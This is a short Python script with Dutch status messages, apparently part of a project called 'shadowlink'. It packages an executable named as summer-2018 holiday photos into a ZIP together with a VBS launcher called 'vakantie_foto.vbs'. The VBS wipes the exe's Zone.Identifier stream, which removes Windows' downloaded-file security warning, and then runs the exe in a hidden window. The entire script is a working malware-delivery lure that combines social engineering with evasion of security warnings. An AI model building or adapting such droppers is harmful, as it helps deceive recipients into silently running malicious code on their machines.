#!/usr/bin/env python3
import os, zipfile, sys

SCRIPT_DIR = os.path.expanduser("~/Documents/shadowlink/fase5")
EXE_SRC    = os.path.join(SCRIPT_DIR, "vakantie_zomer2018.exe")
ZIP_OUT    = os.path.join(SCRIPT_DIR, "vakantie_zomer2018.zip")

VBS_CONTENT = """\
Dim oShell, oFSO, sDir, sExe
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
sDir = oFSO.GetParentFolderName(WScript.ScriptFullName)
sExe = sDir & "\\vakantie_zomer2018.exe"
On Error Resume Next
Dim oADS
Set oADS = oFSO.OpenTextFile(sExe & ":Zone.Identifier", 2, True)
If Err.Number = 0 Then
    oADS.Write ""
    oADS.Close
End If
Err.Clear
On Error GoTo 0
oShell.Run Chr(34) & sExe & Chr(34), 0, False
"""

if not os.path.exists(EXE_SRC):
    print(f"[-] Exe niet gevonden: {EXE_SRC}"); sys.exit(1)

with zipfile.ZipFile(ZIP_OUT, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("vakantie_foto.vbs", VBS_CONTENT)
    zf.write(EXE_SRC, "vakantie_zomer2018.exe")
print("[+] ZIP klaar: alleen VBS + exe")
